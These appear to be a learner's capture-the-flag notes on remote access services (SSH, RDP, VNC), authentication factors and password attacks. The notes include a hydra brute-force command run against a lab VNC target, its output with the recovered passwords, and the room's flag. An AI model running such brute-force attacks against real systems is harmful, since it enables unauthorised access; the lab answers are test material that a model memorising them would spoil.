# HE KNOWS WHEN YOU'RE AWAKE

## Remote Access Services
* allows an individual to administer an end point without needing to be physically in front the endpoint
 * **SSH (Secure Shell):** initially used with Unix-like systems for remote login that provides the user with a CLI that can be used to execute commnads
 * **RDP (Remote Desktop Protocol):** also known as RDC (Remote Destktop Connection) or RD, provides a graphical user interface (GUI) to access an MS Windows system
 * **VNC (Virtual Network Computing):** provides a GUI which allows the user to view the desktop and utilize the mouse and keyboard.
  * available for MS Windows, Linux, MacOS, Andriod, and Rasberry Pi

## Authentication
* refers to the process where a system validates your identity
* one or more of these is used to authenticate to a remote service
* the user needs to prove their ifentity by providing one or more of the following:
  1. **Something you know:** refers to something you can memorize, ie. **password** or a **PIN**
  2. **Something you have:** refers to something you own, ie. **security token, mobile phone**, or a **key file**
  3. **Something you are:** refers to biometeric authentication, ie. **fingerprint** or **retina scan**

## Attacking Passwords
1. **Shoulder Surfing:** as the name suggest, an attacker would look over the shoulder of a vicim to see the pattern they used to unlock their phone or PIN used at an ATM
2. **Password Guessing:** leverages personal information about the target in order to guess the password
3. **Dictionary Attack:** expands on the password guessing and attempts to include all valid words in a dictionary or word list
4. **Brute Force Attack:** the most exhaustive and time-consuming where an attacker can try all possible character combinations

## Hacking an Authentication Service
* when possible it is always a good idea to automate tasks, **hydra** is a utility that can help us automate **brute forcing password atacks** for a variety of services
* sytnax for hydra:
**hydra -l [USERNAME] -P [WORDLIST] [TARGET IP] [SERVICE TO ATTACK]**
 * can also use **[SERVICE]://[TARGET IP]**
 
 
 **Use Hydra to find the VNC password if the target with IP address 10.10.126.77. What is the password?**
 ```bash
 hydra -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-1000.txt 10.10.126.77 vnc
 ```
 ```
 HHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-12-05 15:48:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking vnc://10.10.126.77:5900/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[5900][vnc] host: 10.10.126.77   password: 1q2w3e4r
[5900][vnc] host: 10.10.126.77   password: 1q2w3e4r5t
[STATUS] 599.00 tries/min, 599 tries in 00:01h, 401 to do in 00:01h, 16 active
[STATUS] attack finished for 10.10.126.77 (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-12-05 15:50:03
```

**Using a VNC client on the AttackBox, connect to the target of IP address 10.10.126.77. What is the flag written on the target’s screen?**
```
THM{I_SEE_YOUR_SCREEN}
```
